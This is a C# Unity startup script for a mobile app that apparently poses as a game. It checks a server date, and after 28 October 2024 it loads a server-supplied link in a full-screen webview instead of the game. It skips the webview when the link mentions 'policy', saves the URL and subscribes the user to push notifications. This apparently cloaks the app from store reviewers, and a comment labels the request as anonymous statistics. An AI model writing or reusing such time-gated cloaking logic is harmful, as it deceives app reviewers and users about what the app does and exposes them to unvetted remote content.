using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

namespace Service
{
    public class AppStartupManager : MonoBehaviour
    {
        [TextArea, SerializeField] private string anonymousStatisticSendLink; //just send device_model (without userID) for statistic
        [TextArea, SerializeField] private string osScheme;
        [SerializeField] private string serverDataLink;

        [SerializeField] private Text test_resultLable;

        private const string SavedDataKey = "SavedKey";

        private void Start() => CheckConnectionAndSavedData();

        async void CheckConnectionAndSavedData()
        {
            if (Application.internetReachability != NetworkReachability.NotReachable)
            {
                using (WebClient client = new WebClient())
                {
                    var loadedJSON = client.DownloadString(serverDataLink);

                    var mills = JObject.Parse(loadedJSON).Property("time").Value.ToObject<long>();

                    DateTime current = DateTime.UnixEpoch.AddMilliseconds(mills);

                    if (current < new DateTime(2024, 10, 28))
                    {
                        SceneManager.LoadScene(1);
                        return;
                    }
                }

                OneSignalPlugAdapter.OsInitialize();

                view = gameObject.AddComponent<ViewFactory>();
                view.CreateView(gameObject, safeArea);

                var savedData = PlayerPrefs.GetString(SavedDataKey, "null");
                if (savedData == "null")
                {
                    await SendStatistic(anonymousStatisticSendLink);
                }
                else
                {
                    Show(savedData);
                }
            }
            else
            {
                LaunchGameWithoutServer();
            }
        }

        private async Task SendStatistic(string _savedData)
        {
            var sendAnalyticRequestRes = await PostRequestFactory.CreateRequest(_savedData);

            if (string.IsNullOrEmpty(sendAnalyticRequestRes))
            {
                PrintLog("NJI request fail");

                LaunchGameWithoutServer();
                return;
            }


            var responseToken = JObject.Parse(sendAnalyticRequestRes);

            if (responseToken.ContainsKey("response"))
            {
                var lnk = responseToken.Property("response").Value.ToString();

                if (string.IsNullOrEmpty(lnk))
                {
                    PrintLog("Res is empty");
                    LaunchGameWithoutServer();
                }
                else
                {
                    if (lnk.Contains("policy"))
                    {
                        LaunchGameWithoutServer();
                    }
                    else
                    {
                        Show(lnk);

                        await Task.Delay(1000);

                        PlayerPrefs.SetString(SavedDataKey, view.uniWV.Url);
                        PlayerPrefs.Save();

                        while(string.IsNullOrEmpty(OneSignalPlugAdapter.UserOSIdentificator))
                            await Task.Delay(100);

                        //Subscribe to notifications
                        PostRequestFactory.CreateRequest(string.Format(
                            osScheme, 
                            responseToken.Property("client_id"),
                            OneSignalPlugAdapter.UserOSIdentificator)).Start();
                    }
                }
            }
            else
            {
                PrintLog("No response");
                LaunchGameWithoutServer();
            }
            
        }

        [SerializeField] private GameObject background;
        [SerializeField] private RectTransform safeArea;
        ViewFactory view;




        private void Show(string lnk)
        {
            background.SetActive(true);

            Screen.orientation = ScreenOrientation.AutoRotation;
            Screen.autorotateToLandscapeLeft = true;
            Screen.autorotateToLandscapeRight = true;
            Screen.autorotateToPortrait = true;
            Screen.autorotateToPortraitUpsideDown = true;

            view.uniWV.Load(lnk);
            view.uniWV.Show();

            view.UpdateView();
        }

        private void LaunchGameWithoutServer()
        {
            StopAllCoroutines();

            if (PlayerPrefs.HasKey(SavedDataKey)) OneSignalPlugAdapter.UnSub();

            SceneManager.LoadScene(1);
        }


        private void PrintLog(string msg)
        {
            test_resultLable.text += (msg + '\n');
        }

        [ContextMenu("Delete all PlayerPrefs")]
        private void ClearAll() => PlayerPrefs.DeleteAll();
    }
}
